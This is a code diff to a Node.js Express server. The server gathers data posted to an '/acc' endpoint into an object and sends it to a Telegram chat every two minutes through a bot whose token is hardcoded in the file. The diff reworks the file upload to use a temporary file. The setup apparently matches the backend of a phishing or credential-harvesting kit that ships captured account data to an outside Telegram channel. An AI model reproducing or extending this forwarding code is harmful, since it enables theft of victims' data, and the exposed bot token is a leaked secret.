@@ -3,6 +3,8 @@ const app = express();
 const cors = require('cors');
 const port = process.env.PORT || 3000;
 const path = require('path');
+const fs = require('fs');
+const os = require('os');
 const setupJsFileRoutes = require('./setupJsFileRoutes');
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot('7271931429:AAHY6hbLcexDXhL7cmvmPc-xZjfrHAEbSUI', { polling: false });
@@ -133,15 +135,30 @@ app.post('/acc', (req, res) => {
 
 // Function to send motherObject as a text file via Telegram
 function sendMotherObjectViaTelegram() {
-  const userId = '7136999028'; // Replace with the actual Telegram user ID
+  const userId = 'TELEGRAM_USER_ID'; // Replace with the actual Telegram user ID
   const text = JSON.stringify(motherObject, null, 2);
   
-  bot.sendDocument(userId, Buffer.from(text), {
-    filename: 'mother_object.txt',
-    contentType: 'text/plain',
-  }).catch(error => console.error('Error sending file:', error));
-}
+  // Create a temporary file
+  const tempFilePath = path.join(os.tmpdir(), 'mother_object.txt');
+  
+  fs.writeFile(tempFilePath, text, (err) => {
+    if (err) {
+      console.error('Error writing temporary file:', err);
+      return;
+    }
 
+    // Send the file
+    bot.sendDocument(userId, tempFilePath, {}, {
+      filename: 'mother_object.txt',
+      contentType: 'text/plain',
+    }).then(() => {
+      // Delete the temporary file after sending
+      fs.unlink(tempFilePath, (err) => {
+        if (err) console.error('Error deleting temporary file:', err);
+      });
+    }).catch(error => console.error('Error sending file:', error));
+  });
+}
 // Set up interval to send motherObject every 2 minutes
 setInterval(sendMotherObjectViaTelegram, 2 * 60 * 1000);
 
